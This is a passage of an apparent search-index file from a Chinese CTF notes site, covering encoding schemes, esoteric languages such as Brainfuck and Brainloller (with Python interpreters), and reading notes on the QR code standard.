\u7ed3\u5c3e\u4f1a\u6709\u8f83\u591a\u7b49\u53f7 A-Z2-7 Base16 \u662f\u4e00\u4e2a\u5341\u516d\u8fdb\u5236\u4e32 0-9A-F \u5de5\u5177\uff1a mufeedvh/basecrack","title":"Base\u7cfb\u5217"},{"location":"ctf/coding/#xxencode-uuencode","text":"\u7c7b\u4f3c Base64 xxencode \u5b57\u7b26\u96c6\uff1a +-0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz uuencode \u5b57\u7b26\u96c6\uff1a !\"#$%&'()*+,-./0123456789:;<=>?@ABCDEFGHIJKLMNOPQRSTUVWXYZ[\\]^_ \u7a7a\u683c\u53ef\u80fd\u4f1a\u6539\u4e3a ` \u5de5\u5177\uff1apython codecs.encode / codecs.decode","title":"xxencode &amp; uuencode"},{"location":"ctf/coding/#unicode","text":"https://home.unicode.org/ https://tool.chinaz.com/Tools/Unicode.aspx","title":"Unicode"},{"location":"ctf/coding/#emojis","text":"https://www.emojiall.com/zh-hans emoji-aes \uff08\u9700\u8981 key\uff09\uff0c\u7279\u5f81\uff1a\ud83d\ude43\ud83d\udcb5\ud83c\udf3f\ud83c\udfa4\u7b49\u5f00\u5934","title":"Emojis"},{"location":"ctf/coding/#_3","text":"DenCode\uff1a https://dencode.com/ Ciphey\uff1a Ciphey/Ciphey CyberChef\uff1a https://gchq.github.io/CyberChef/ emoji-aes\uff1a https://aghorler.github.io/emoji-aes/ tool box\uff1a http://www.hiencode.com/","title":"\u5de5\u5177"},{"location":"ctf/coding/#_4","text":"\u76f2\u6587\u6570\u5b66\uff1a https://nemeth.aphtech.org/ \u4e09\u8bcd\u5730\u5740\uff1a https://map.what3words.com/","title":"\u5176\u4ed6\u7f16\u7801"},{"location":"ctf/coding/#_5","text":"","title":"\u53e4\u5178\u5bc6\u7801"},{"location":"ctf/esolang/","text":"Esolang \u6df1\u5965\u7f16\u7a0b\u8bed\u8a00 \u00b6 An esoteric programming language, or esolang, is a computer programming language designed to experiment with weird ideas, to be hard to program in, or as a joke, rather than for practical use. \u2014\u2014\u2014\u2014 esolang wiki Abstract \u6b64\u5904\u6574\u7406\u4e86\u4e00\u4e9b\u7279\u6b8a\u7684\u7f16\u7a0b\u8bed\u8a00\u6216\u8005\u6b63\u5e38\u7f16\u7a0b\u8bed\u8a00\u7684\u7279\u6b8a\u4f7f\u7528\u65b9\u6cd5\uff0c\u591a\u89c1\u4e8eMisc\u9898\u4e2d\uff0c\u4f46\u662f\u6b64\u9875\u9762\u4e5f\u4ec5\u662f\u4ecb\u7ecd\u4e00\u4e9b\u5e38\u89c1\u7684 Esolang\u548c\u5df2\u7ecf\u9047\u5230\u8fc7\u7684Esolang\uff0c\u9898\u76ee\u4e2d\u9047\u5230\u8fd8\u662f\u8981\u968f\u673a\u5e94\u53d8\uff0c\u5584\u7528\u641c\u7d22 Esolang, the esoteric programming languages wiki \u6781\u5c0f\u8bed\u8a00 \u00b6 \u6781\u5c0f\u8bed\u8a00\u6307\u7684\u662f\u6307\u4ee4\u6570\u5f88\u5c11\u7684\u4e00\u79cd Esolang BrainFuck \u00b6 \u7279\u5f81\uff1a\u5305\u542b ><+-.,[] \u516b\u4e2a\u6307\u4ee4\uff0c\u5177\u6709\u56fe\u7075\u5b8c\u5907\u6027 \u6307\u4ee4 \u542b\u4e49 > \u6307\u9488\u52a0\u4e00\uff08\u53f3\u79fb\u4e00\u4f4d\uff09 < \u6307\u9488\u51cf\u4e00\uff08\u5de6\u79fb\u4e00\u4f4d\uff09 + \u6307\u9488\u6307\u5411\u7684\u5355\u5143\u7684\u503c\u52a0\u4e00 - \u6307\u9488\u6307\u5411\u7684\u5355\u5143\u7684\u503c\u51cf\u4e00 . \u8f93\u51fa\u6307\u9488\u6307\u5411\u7684\u5355\u5143\u5185\u5bb9\uff08ASCII\u7801\uff09 , \u8f93\u5165\u5185\u5bb9\u5230\u6307\u9488\u6307\u5411\u7684\u5355\u5143\uff08ASCII\u7801\uff09 [ \u5982\u679c\u6307\u9488\u6307\u5411\u7684\u5355\u5143\u503c\u4e3a\u96f6\uff0c\u5411\u540e\u8df3\u8f6c\u5230\u5bf9\u5e94\u7684 ] \u6307\u4ee4\u7684\u6b21\u4e00\u6307\u4ee4\u5904 ] \u5982\u679c\u6307\u9488\u6307\u5411\u7684\u5355\u5143\u503c\u4e0d\u4e3a\u96f6\uff0c\u5411\u524d\u8df3\u8f6c\u5230\u5bf9\u5e94\u7684 [ \u6307\u4ee4\u7684\u6b21\u4e00\u6307\u4ee4\u5904 \u5176\u5b83 \u76f4\u63a5\u5ffd\u7565 e.g. ++++++++ [>++++++++++++>+++++++++++++<<-] >++++. -. >+++++++. <+. +. BrainFuck \u89e3\u91ca\u5668 import sys def Brainfuck ( code ): code = '' . join ( filter ( lambda x : x in [ '.' , ',' , '[' , ']' , '<' , '>' , '+' , '-' ], code )) bracemap = buildbracemap ( code ) cells , codeptr , cellptr = [ 0 ], 0 , 0 result = '' while codeptr < len ( code ): command = code [ codeptr ] if command == \">\" : cellptr += 1 if cellptr == len ( cells ): cells . append ( 0 ) elif command == \"<\" : cellptr = 0 if cellptr <= 0 else cellptr - 1 elif command == \"+\" : cells [ cellptr ] = cells [ cellptr ] + 1 if cells [ cellptr ] < 255 else 0 elif command == \"-\" : cells [ cellptr ] = cells [ cellptr ] - 1 if cells [ cellptr ] > 0 else 255 elif command == \"[\" and cells [ cellptr ] == 0 : codeptr = bracemap [ codeptr ] elif command == \"]\" and cells [ cellptr ] != 0 : codeptr = bracemap [ codeptr ] elif command == \".\" : result += chr ( cells [ cellptr ]) elif command == \",\" : cells [ cellptr ] = ord ( input ( \"[*] input one char > \" )) codeptr += 1 print ( f \"[+] Result: { result } \" ) def buildbracemap ( code ): temp_bracestack , bracemap = [], {} for position , command in enumerate ( code ): if command == \"[\" : temp_bracestack . append ( position ) if command == \"]\" : start = temp_bracestack . pop () bracemap [ start ] = position bracemap [ position ] = start return bracemap if __name__ == \"__main__\" : code = input ( \"[*] Input brainfuck code > \" ) Brainfuck ( code ) \u53ef\u89c6\u5316\u6267\u884c\uff1a http://fatiherikli.github.io/brainfuck-visualizer/ Brainfuck Language - Online Decoder, Translator, Interpreter (dcode.fr) Marcos Minond \u53e6\u6709\u4f17\u591a\u53d8\u79cd\uff0c\u5982 Ook!\uff0cBrainfuck+3\uff0c*brainfuck \u7b49 \u8981\u6bd4\u8f83\u6ce8\u610f\u7684\u4e00\u70b9\u662f\uff0c\u6709\u7684 brainfuck \u4ee3\u7801\u4f1a\u5411\u5de6\u8d8a\u754c\uff0c\u8fd9\u79cd\u60c5\u51b5\u4e0b\u8981\u628a\u89e3\u91ca\u5668\u7684\u521d\u59cb\u4f4d\u7f6e\u5f80\u540e\u79fb\u4e00\u4e0b\uff08\u6bd4\u5982\u4e0b\u9762\u7684\u4ee3\u7801\u4e2d\u9884\u5148\u6269\u5145 cells \uff0c\u7136\u540e\u4ee4\u8d77\u59cb\u7684 cellptr \u5927\u4e8e0\uff09 Ook! \u00b6 \u7279\u5f81\uff1a\u5168\u662f Ook Ook! Programming Language - Esoteric Code Decoder, Encoder, Translator (dcode.fr) \u56fe\u5f62\u5316\u8bed\u8a00 \u00b6 \u56fe\u5f62\u5316\u8bed\u8a00\u662f\u7528\u4e00\u4e9b\u50cf\u7d20\u56fe\u6784\u5efa\u6781\u5c0f\u8bed\u8a00\u7684 Esolang\uff0c\u6700\u4e3a\u8457\u540d\u7684\u662f Piet Piet \u00b6 \u7279\u5f81\uff1a\u50cf\u7d20\u56fe\uff0c\u4e14\u53ea\u670920\u79cd\u989c\u8272\uff1a #FFC0C0 #FFFFC0 #C0FFC0 #C0FFFF #C0C0FF #FFC0FF #FF0000 #FFFF00 #00FF00 #00FFFF #0000FF #FF00FF #C00000 #C0C000 #00C000 #00C0C0 #0000C0 #C000C0 #FFFFFF #000000 \u4ec5\u7531 00\u3001C0\u3001FF \u6784\u6210\uff0c\u4f8b\u5982\uff1a DM's Esoteric Programming Languages - Piet (dangermouse.net) DM's Esoteric Programming Languages - Piet Samples (dangermouse.net) \u53e6\u8fd8\u6709\u4e00\u4e9b\u4e9b\u53d8\u79cd\uff0c\u5982 Piet-Q Brainloller \u00b6 \u7279\u5f81\uff1a\u50cf\u7d20\u56fe\uff0c\u4e14\u53ea\u670910\u79cd\u989c\u8272\uff0c\u5176\u4e2d8\u79cd\u5bf9\u5e94 BF \u76848\u4e2a\u6307\u4ee4\uff0c2\u79cd\u5bf9\u5e94\u6307\u9488\u65cb\u8f6c\u6307\u4ee4\uff0c\u4e14\u4ec5\u7531 00\u300180\u3001FF \u6784\u6210 \u989c\u8272 hex \u503c rgb \u503c \u542b\u4e49 \u7ea2 #FF0000 (255, 0, 0) > \u6df1\u7ea2 #800000 (128, 0, 0) < \u7eff #00FF00 (0, 255, 0) + \u6df1\u7eff #008000 (0, 128, 0) - \u84dd #0000FF (0, 0, 255) . \u6df1\u84dd #000080 (0, 0, 128) , \u9ec4 #FFFF00 (255, 255, 0) [ \u6df1\u9ec4 #808000 (128, 128, 0) ] \u9752 #00FFFF (0, 255, 255) IP\u987a\u65f6\u948890\u00b0 \u6df1\u9752 #008080 (0, 128, 128) IP\u9006\u65f6\u948890\u00b0 \u4f8b\u9898\uff1a\u7b2c\u56db\u5c4a\u201d\u5b89\u6d35\u676f\u201d\u7f51\u7edc\u5b89\u5168\u6311\u6218\u8d5b CyzCC_loves_LOL Marcos Minond Brainloller \u89e3\u91ca\u5668 from PIL import Image import sys def Brainloller ( filename ): source = Image . open ( filename ) . convert ( \"RGB\" ) width , height = source . size result = '' ptr = ( 0 , 0 ) direction = 0 while True : if ptr [ 0 ] >= height or ptr [ 0 ] < 0 or ptr [ 1 ] >= width or ptr [ 1 ] < 0 : break else : color = source . getpixel (( ptr [ 1 ], ptr [ 0 ])) if color == ( 255 , 0 , 0 ): result += '>' elif color == ( 128 , 0 , 0 ): result += '<' elif color == ( 0 , 255 , 0 ): result += '+' elif color == ( 0 , 128 , 0 ): result += '-' elif color == ( 0 , 0 , 255 ): result += '.' elif color == ( 0 , 0 , 128 ): result += ',' elif color == ( 255 , 255 , 0 ): result += '[' elif color == ( 128 , 128 , 0 ): result += ']' elif color == ( 0 , 255 , 255 ): direction = ( direction + 1 ) % 4 elif color == ( 0 , 128 , 128 ): direction = ( direction - 1 ) % 4 else : print ( f \"[-] Unknown color: { color } \" ) if direction == 0 : ptr = ptr [ 0 ], ptr [ 1 ] + 1 elif direction == 1 : ptr = ptr [ 0 ] + 1 , ptr [ 1 ] elif direction == 2 : ptr = ptr [ 0 ], ptr [ 1 ] - 1 elif direction == 3 : ptr = ptr [ 0 ] - 1 , ptr [ 1 ] print ( f \"[+] BrainFuck Code: { result } \" ) return result def Brainfuck ( code ): code = '' . join ( filter ( lambda x : x in [ '.' , ',' , '[' , ']' , '<' , '>' , '+' , '-' ], code )) bracemap = buildbracemap ( code ) cells , codeptr , cellptr = [ 0 ], 0 , 0 result = '' while codeptr < len ( code ): command = code [ codeptr ] if command == \">\" : cellptr += 1 if cellptr == len ( cells ): cells . append ( 0 ) elif command == \"<\" : cellptr = 0 if cellptr <= 0 else cellptr - 1 elif command == \"+\" : cells [ cellptr ] = cells [ cellptr ] + 1 if cells [ cellptr ] < 255 else 0 elif command == \"-\" : cells [ cellptr ] = cells [ cellptr ] - 1 if cells [ cellptr ] > 0 else 255 elif command == \"[\" and cells [ cellptr ] == 0 : codeptr = bracemap [ codeptr ] elif command == \"]\" and cells [ cellptr ] != 0 : codeptr = bracemap [ codeptr ] elif command == \".\" : result += chr ( cells [ cellptr ]) elif command == \",\" : cells [ cellptr ] = ord ( input ( \"[*] input one char > \" )) codeptr += 1 print ( f \"[+] Result: { result } \" ) def buildbracemap ( code ): temp_bracestack , bracemap = [], {} for position , command in enumerate ( code ): if command == \"[\" : temp_bracestack . append ( position ) if command == \"]\" : start = temp_bracestack . pop () bracemap [ start ] = position bracemap [ position ] = start return bracemap if __name__ == \"__main__\" : Brainfuck ( Brainloller ( sys . argv [ 1 ])) \u7279\u6b8a\u5173\u952e\u5b57\u8bed\u8a00 \u00b6 LOLcode \u00b6 \u4f8b\u9898\uff1a\u7b2c\u56db\u5c4a\u201d\u5b89\u6d35\u676f\u201d\u7f51\u7edc\u5b89\u5168\u6311\u6218\u8d5b CyzCC_loves_LOL LOLCODE Language - Compiler - Online Decoder, Encoder, Translator","title":"Esolang"},{"location":"ctf/esolang/#esolang","text":"An esoteric programming language, or esolang, is a computer programming language designed to experiment with weird ideas, to be hard to program in, or as a joke, rather than for practical use. \u2014\u2014\u2014\u2014 esolang wiki Abstract \u6b64\u5904\u6574\u7406\u4e86\u4e00\u4e9b\u7279\u6b8a\u7684\u7f16\u7a0b\u8bed\u8a00\u6216\u8005\u6b63\u5e38\u7f16\u7a0b\u8bed\u8a00\u7684\u7279\u6b8a\u4f7f\u7528\u65b9\u6cd5\uff0c\u591a\u89c1\u4e8eMisc\u9898\u4e2d\uff0c\u4f46\u662f\u6b64\u9875\u9762\u4e5f\u4ec5\u662f\u4ecb\u7ecd\u4e00\u4e9b\u5e38\u89c1\u7684 Esolang\u548c\u5df2\u7ecf\u9047\u5230\u8fc7\u7684Esolang\uff0c\u9898\u76ee\u4e2d\u9047\u5230\u8fd8\u662f\u8981\u968f\u673a\u5e94\u53d8\uff0c\u5584\u7528\u641c\u7d22 Esolang, the esoteric programming languages wiki","title":"Esolang \u6df1\u5965\u7f16\u7a0b\u8bed\u8a00"},{"location":"ctf/esolang/#_1","text":"\u6781\u5c0f\u8bed\u8a00\u6307\u7684\u662f\u6307\u4ee4\u6570\u5f88\u5c11\u7684\u4e00\u79cd Esolang","title":"\u6781\u5c0f\u8bed\u8a00"},{"location":"ctf/esolang/#brainfuck","text":"\u7279\u5f81\uff1a\u5305\u542b ><+-.,[] \u516b\u4e2a\u6307\u4ee4\uff0c\u5177\u6709\u56fe\u7075\u5b8c\u5907\u6027 \u6307\u4ee4 \u542b\u4e49 > \u6307\u9488\u52a0\u4e00\uff08\u53f3\u79fb\u4e00\u4f4d\uff09 < \u6307\u9488\u51cf\u4e00\uff08\u5de6\u79fb\u4e00\u4f4d\uff09 + \u6307\u9488\u6307\u5411\u7684\u5355\u5143\u7684\u503c\u52a0\u4e00 - \u6307\u9488\u6307\u5411\u7684\u5355\u5143\u7684\u503c\u51cf\u4e00 . \u8f93\u51fa\u6307\u9488\u6307\u5411\u7684\u5355\u5143\u5185\u5bb9\uff08ASCII\u7801\uff09 , \u8f93\u5165\u5185\u5bb9\u5230\u6307\u9488\u6307\u5411\u7684\u5355\u5143\uff08ASCII\u7801\uff09 [ \u5982\u679c\u6307\u9488\u6307\u5411\u7684\u5355\u5143\u503c\u4e3a\u96f6\uff0c\u5411\u540e\u8df3\u8f6c\u5230\u5bf9\u5e94\u7684 ] \u6307\u4ee4\u7684\u6b21\u4e00\u6307\u4ee4\u5904 ] \u5982\u679c\u6307\u9488\u6307\u5411\u7684\u5355\u5143\u503c\u4e0d\u4e3a\u96f6\uff0c\u5411\u524d\u8df3\u8f6c\u5230\u5bf9\u5e94\u7684 [ \u6307\u4ee4\u7684\u6b21\u4e00\u6307\u4ee4\u5904 \u5176\u5b83 \u76f4\u63a5\u5ffd\u7565 e.g. ++++++++ [>++++++++++++>+++++++++++++<<-] >++++. -. >+++++++. <+. +. BrainFuck \u89e3\u91ca\u5668 import sys def Brainfuck ( code ): code = '' . join ( filter ( lambda x : x in [ '.' , ',' , '[' , ']' , '<' , '>' , '+' , '-' ], code )) bracemap = buildbracemap ( code ) cells , codeptr , cellptr = [ 0 ], 0 , 0 result = '' while codeptr < len ( code ): command = code [ codeptr ] if command == \">\" : cellptr += 1 if cellptr == len ( cells ): cells . append ( 0 ) elif command == \"<\" : cellptr = 0 if cellptr <= 0 else cellptr - 1 elif command == \"+\" : cells [ cellptr ] = cells [ cellptr ] + 1 if cells [ cellptr ] < 255 else 0 elif command == \"-\" : cells [ cellptr ] = cells [ cellptr ] - 1 if cells [ cellptr ] > 0 else 255 elif command == \"[\" and cells [ cellptr ] == 0 : codeptr = bracemap [ codeptr ] elif command == \"]\" and cells [ cellptr ] != 0 : codeptr = bracemap [ codeptr ] elif command == \".\" : result += chr ( cells [ cellptr ]) elif command == \",\" : cells [ cellptr ] = ord ( input ( \"[*] input one char > \" )) codeptr += 1 print ( f \"[+] Result: { result } \" ) def buildbracemap ( code ): temp_bracestack , bracemap = [], {} for position , command in enumerate ( code ): if command == \"[\" : temp_bracestack . append ( position ) if command == \"]\" : start = temp_bracestack . pop () bracemap [ start ] = position bracemap [ position ] = start return bracemap if __name__ == \"__main__\" : code = input ( \"[*] Input brainfuck code > \" ) Brainfuck ( code ) \u53ef\u89c6\u5316\u6267\u884c\uff1a http://fatiherikli.github.io/brainfuck-visualizer/ Brainfuck Language - Online Decoder, Translator, Interpreter (dcode.fr) Marcos Minond \u53e6\u6709\u4f17\u591a\u53d8\u79cd\uff0c\u5982 Ook!\uff0cBrainfuck+3\uff0c*brainfuck \u7b49 \u8981\u6bd4\u8f83\u6ce8\u610f\u7684\u4e00\u70b9\u662f\uff0c\u6709\u7684 brainfuck \u4ee3\u7801\u4f1a\u5411\u5de6\u8d8a\u754c\uff0c\u8fd9\u79cd\u60c5\u51b5\u4e0b\u8981\u628a\u89e3\u91ca\u5668\u7684\u521d\u59cb\u4f4d\u7f6e\u5f80\u540e\u79fb\u4e00\u4e0b\uff08\u6bd4\u5982\u4e0b\u9762\u7684\u4ee3\u7801\u4e2d\u9884\u5148\u6269\u5145 cells \uff0c\u7136\u540e\u4ee4\u8d77\u59cb\u7684 cellptr \u5927\u4e8e0\uff09","title":"BrainFuck"},{"location":"ctf/esolang/#ook","text":"\u7279\u5f81\uff1a\u5168\u662f Ook Ook! Programming Language - Esoteric Code Decoder, Encoder, Translator (dcode.fr)","title":"Ook!"},{"location":"ctf/esolang/#_2","text":"\u56fe\u5f62\u5316\u8bed\u8a00\u662f\u7528\u4e00\u4e9b\u50cf\u7d20\u56fe\u6784\u5efa\u6781\u5c0f\u8bed\u8a00\u7684 Esolang\uff0c\u6700\u4e3a\u8457\u540d\u7684\u662f Piet","title":"\u56fe\u5f62\u5316\u8bed\u8a00"},{"location":"ctf/esolang/#piet","text":"\u7279\u5f81\uff1a\u50cf\u7d20\u56fe\uff0c\u4e14\u53ea\u670920\u79cd\u989c\u8272\uff1a #FFC0C0 #FFFFC0 #C0FFC0 #C0FFFF #C0C0FF #FFC0FF #FF0000 #FFFF00 #00FF00 #00FFFF #0000FF #FF00FF #C00000 #C0C000 #00C000 #00C0C0 #0000C0 #C000C0 #FFFFFF #000000 \u4ec5\u7531 00\u3001C0\u3001FF \u6784\u6210\uff0c\u4f8b\u5982\uff1a DM's Esoteric Programming Languages - Piet (dangermouse.net) DM's Esoteric Programming Languages - Piet Samples (dangermouse.net) \u53e6\u8fd8\u6709\u4e00\u4e9b\u4e9b\u53d8\u79cd\uff0c\u5982 Piet-Q","title":"Piet"},{"location":"ctf/esolang/#brainloller","text":"\u7279\u5f81\uff1a\u50cf\u7d20\u56fe\uff0c\u4e14\u53ea\u670910\u79cd\u989c\u8272\uff0c\u5176\u4e2d8\u79cd\u5bf9\u5e94 BF \u76848\u4e2a\u6307\u4ee4\uff0c2\u79cd\u5bf9\u5e94\u6307\u9488\u65cb\u8f6c\u6307\u4ee4\uff0c\u4e14\u4ec5\u7531 00\u300180\u3001FF \u6784\u6210 \u989c\u8272 hex \u503c rgb \u503c \u542b\u4e49 \u7ea2 #FF0000 (255, 0, 0) > \u6df1\u7ea2 #800000 (128, 0, 0) < \u7eff #00FF00 (0, 255, 0) + \u6df1\u7eff #008000 (0, 128, 0) - \u84dd #0000FF (0, 0, 255) . \u6df1\u84dd #000080 (0, 0, 128) , \u9ec4 #FFFF00 (255, 255, 0) [ \u6df1\u9ec4 #808000 (128, 128, 0) ] \u9752 #00FFFF (0, 255, 255) IP\u987a\u65f6\u948890\u00b0 \u6df1\u9752 #008080 (0, 128, 128) IP\u9006\u65f6\u948890\u00b0 \u4f8b\u9898\uff1a\u7b2c\u56db\u5c4a\u201d\u5b89\u6d35\u676f\u201d\u7f51\u7edc\u5b89\u5168\u6311\u6218\u8d5b CyzCC_loves_LOL Marcos Minond Brainloller \u89e3\u91ca\u5668 from PIL import Image import sys def Brainloller ( filename ): source = Image . open ( filename ) . convert ( \"RGB\" ) width , height = source . size result = '' ptr = ( 0 , 0 ) direction = 0 while True : if ptr [ 0 ] >= height or ptr [ 0 ] < 0 or ptr [ 1 ] >= width or ptr [ 1 ] < 0 : break else : color = source . getpixel (( ptr [ 1 ], ptr [ 0 ])) if color == ( 255 , 0 , 0 ): result += '>' elif color == ( 128 , 0 , 0 ): result += '<' elif color == ( 0 , 255 , 0 ): result += '+' elif color == ( 0 , 128 , 0 ): result += '-' elif color == ( 0 , 0 , 255 ): result += '.' elif color == ( 0 , 0 , 128 ): result += ',' elif color == ( 255 , 255 , 0 ): result += '[' elif color == ( 128 , 128 , 0 ): result += ']' elif color == ( 0 , 255 , 255 ): direction = ( direction + 1 ) % 4 elif color == ( 0 , 128 , 128 ): direction = ( direction - 1 ) % 4 else : print ( f \"[-] Unknown color: { color } \" ) if direction == 0 : ptr = ptr [ 0 ], ptr [ 1 ] + 1 elif direction == 1 : ptr = ptr [ 0 ] + 1 , ptr [ 1 ] elif direction == 2 : ptr = ptr [ 0 ], ptr [ 1 ] - 1 elif direction == 3 : ptr = ptr [ 0 ] - 1 , ptr [ 1 ] print ( f \"[+] BrainFuck Code: { result } \" ) return result def Brainfuck ( code ): code = '' . join ( filter ( lambda x : x in [ '.' , ',' , '[' , ']' , '<' , '>' , '+' , '-' ], code )) bracemap = buildbracemap ( code ) cells , codeptr , cellptr = [ 0 ], 0 , 0 result = '' while codeptr < len ( code ): command = code [ codeptr ] if command == \">\" : cellptr += 1 if cellptr == len ( cells ): cells . append ( 0 ) elif command == \"<\" : cellptr = 0 if cellptr <= 0 else cellptr - 1 elif command == \"+\" : cells [ cellptr ] = cells [ cellptr ] + 1 if cells [ cellptr ] < 255 else 0 elif command == \"-\" : cells [ cellptr ] = cells [ cellptr ] - 1 if cells [ cellptr ] > 0 else 255 elif command == \"[\" and cells [ cellptr ] == 0 : codeptr = bracemap [ codeptr ] elif command == \"]\" and cells [ cellptr ] != 0 : codeptr = bracemap [ codeptr ] elif command == \".\" : result += chr ( cells [ cellptr ]) elif command == \",\" : cells [ cellptr ] = ord ( input ( \"[*] input one char > \" )) codeptr += 1 print ( f \"[+] Result: { result } \" ) def buildbracemap ( code ): temp_bracestack , bracemap = [], {} for position , command in enumerate ( code ): if command == \"[\" : temp_bracestack . append ( position ) if command == \"]\" : start = temp_bracestack . pop () bracemap [ start ] = position bracemap [ position ] = start return bracemap if __name__ == \"__main__\" : Brainfuck ( Brainloller ( sys . argv [ 1 ]))","title":"Brainloller"},{"location":"ctf/esolang/#_3","text":"","title":"\u7279\u6b8a\u5173\u952e\u5b57\u8bed\u8a00"},{"location":"ctf/esolang/#lolcode","text":"\u4f8b\u9898\uff1a\u7b2c\u56db\u5c4a\u201d\u5b89\u6d35\u676f\u201d\u7f51\u7edc\u5b89\u5168\u6311\u6218\u8d5b CyzCC_loves_LOL LOLCODE Language - Compiler - Online Decoder, Encoder, Translator","title":"LOLcode"},{"location":"ctf/qrcode/","text":"\u4e8c\u7ef4\u7801 QRCode \u6807\u51c6\u9605\u8bfb \u00b6 \u6700\u8fd1\u51e0\u6b21\u6bd4\u8d5b\u9047\u5230\u8fc7\u597d\u51e0\u6b21\u4e8c\u7ef4\u7801\u7684\u9898\u76ee\uff0c\u6253\u7b97\u597d\u597d\u6765\u8bfb\u4e00\u8bfb\u6807\u51c6\u6587\u6863 ISO/IEC 18004:2015 \u6587\u6863 6.1 \u524d\u9762\u7684\u5185\u5bb9\u4e0d\u591a\uff0c\u5c31\u4ece\u5b83\u540e\u9762\u5f00\u59cb\u8bb0\u4e86 \u57fa\u7840\u63cf\u8ff0\u53ca\u7ed3\u6784\uff086.1\u30016.3\uff09 \u00b6 \u57fa\u7840\u63cf\u8ff0\uff085.3\u30016.1\uff09 \u00b6 \u5757\u4f4d\u7f6e\uff1a\u5de6\u4e0a\u89d2\u4e3a\u539f\u70b9 (0, 0) \u5411\u4e0bx+\uff0c\u5411\u53f3y+ \u7248\u672c\u8868\u793a\uff1aVersion V-E\uff08\u5176\u4e2dV\u662f\u7248\u672c\u53f7\uff0cE\u662f\u7ea0\u9519\u7b49\u7ea7\uff09 \u6570\u636e\u8868\u793a\uff1a\u9ed1\u5757-1 \u767d\u5757-0\uff08\u53ef\u4ee5\u5e26\u80cc\u666f\u5168\u90e8\u53cd\u8272\uff09 \u5927\u5c0f\uff1a\u4ece\u7248\u672c1\u5230\u7248\u672c40\u4f9d\u6b21\u662f 21x21 \uff5e 177x177\uff08\u6bcf\u589e\u52a0\u4e00\u4e2a\u7248\u672c\uff0c\u8fb9\u957f\u589e\u52a04\uff09 \u652f\u6301\u7684\u6700\u591a\u5b57\u7b26\u6570\uff08\u7248\u672c40\uff09 \u6570\u5b57\u6a21\u5f0f\uff1a7089 \u5b57\u6bcd\u6a21\u5f0f\uff1a4296 \u5b57\u8282\u6a21\u5f0f\uff1a2953 \u65e5\u6587\u6a21\u5f0f\uff1a1817 \u7ea0\u9519\u7b49\u7ea7\u5141\u8bb8\u7684\u6062\u590d\u6bd4\u4f8b L\uff1a7% M\uff1a15% Q\uff1a25% H\uff1a30% \u4e8c\u7ef4\u7801\u7ed3\u6784\uff086.3\uff09 \u00b6 \u529f\u80fd\u56fe\u6848\uff08function patterns\uff09 \u7279\u5f81\u7b26\uff08finder pattern\uff097x7\u9ed1\u5708 5x5\u767d\u5708 3x3\u9ed1\u5757 \u5206\u5272\u7ebf\uff08separator\uff09\u5728\u7279\u5f81\u7b26\u5468\u56f4\u7684\u4e00\u5708\u5168\u767d\u533a\u57df \u65f6\u5e8f\u56fe\u6848\uff08timing patterns\uff09\u7b2c7\u884c\u7b2c7\u5217\u7684\u4e24\u6761\u9ed1\u767d\u6761\u7eb9 \u5bf9\u9f50\u56fe\u6848\uff08alignment patterns\uff09\u7248\u672c1\u65e0\uff0c\u7248\u672c2-6 1\u4e2a\uff0c\u7248\u672c7-13 6\u4e2a\u2026\u2026\uff08\u9644\u5f55E\uff09 \u9759\u9ed8\u533a\uff08quiet zone\uff09\u81f3\u5c114\u4e2a\u5355\u4f4d\u5bbd \u7f16\u7801\u533a\u57df\uff08encoding region\uff09 \u683c\u5f0f\u4fe1\u606f\uff08format information\uff09\u5de6\u4e0a\u89d2\u5206\u5272\u7ebf\u5916\u4e00\u5708\uff0c\u5de6\u4e0b\u89d2\u5206\u5272\u7ebf\u53f3\u4fa7\uff0c\u53f3\u4e0a\u89d2\u5206\u5272\u7ebf\u4e0b\u4fa7 \u7248\u672c\u4fe1\u606f\uff08version information\uff09\u7248\u672c7\u540e\u624d\u6709\uff0c\u5728\u5de6\u4e0b\u5206\u5272\u7ebf\u4e0a\u4fa7\uff0c\u53f3\u4e0a\u5206\u5272\u7ebf\u5de6\u4fa7 \u6570\u636e\u53ca\u7ea0\u9519\u7801\u533a\u57df \u6570\u636e\u7f16\u7801\uff087.4\uff09 \u00b6 \u6570\u636e\u5e8f\u5217\uff087.4.1\uff09 \u00b6 \u9ed8\u8ba4\u7684 ECI \u6a21\u5f0f\u4e0b\uff0c\u6bd4\u7279\u6d41\u4ee5\u6a21\u5f0f\u6807\u8bc6\u7b26\u5f00\u59cb\u3002\u5982\u679c\u4e0d\u662f\u9ed8\u8ba4 ECI \u6a21\u5f0f\uff0c\u5219\u9700\u8981\u4ece ECI \u5934\u5f00\u59cb\uff1a \uff084 bits\uff09ECI \u6a21\u5f0f\u6807\u8bc6\u7b26 \uff088/16/24 bits\uff09ECI Designator \u6bd4\u7279\u6d41\u7684\u5269\u4f59\u90e8\u5206\u7531\u4e0b\u9762\u51e0\u90e8\u5206\u7ec4\u6210\uff1a \uff084 bits\uff09\u6a21\u5f0f\u6807\u8bc6\u7b26 \u5b57\u7b26\u6570\u91cf\u6807\u8bc6\u7b26\uff08\u957f\u5ea6\u89c1\u4e0b\u7b2c\u4e8c\u4e2a\u8868\uff09 \u6570\u636e\u6bd4\u7279\u6d41 \u6a21\u5f0f \u6807\u8bc6\u7b26 \u8bf4\u660e ECI 0111 \u6570\u5b57\u6a21\u5f0f 0001 \u53ea\u5305\u542b\u6570\u5b570-9\uff0c3\u4e2a\u6570\u5b57 10 bits \u5b57\u6bcd\u6570\u5b57\u6a21\u5f0f 0010 45\u4e2a\u5b57\u7b26\uff0c0-9A-Z \u53ca9\u4e2a\u7b26\u53f7 \u7a7a\u683c$%*+-./:\uff0c2\u4e2a\u5b57\u7b26 11 bits \u5b57\u8282\u6a21\u5f0f 0100 \u6bcf\u4e2a\u5b57\u7b26 8 bits \u65e5\u672c\u6c49\u5b57\u6a21\u5f0f 1000 \u7ed3\u6784\u6dfb\u52a0\u6a21\u5f0f 0011 \u7248\u672c \u6570\u5b57\u6a21\u5f0f\u5b57\u7b26\u6570\u91cf\u6807\u8bc6\u7b26\u957f\u5ea6 \u5b57\u6bcd\u6a21\u5f0f\u2026\u2026 \u5b57\u8282\u6a21\u5f0f\u2026\u2026 \u65e5\u6587\u6a21\u5f0f\u2026\u2026 1\uff5e9 10 9 8 8 10\uff5e26 12 11 16 10 27\uff5e40 14 13 16 12 ECI \u6a21\u5f0f\uff087.4.2\uff09 \u00b6 ECI 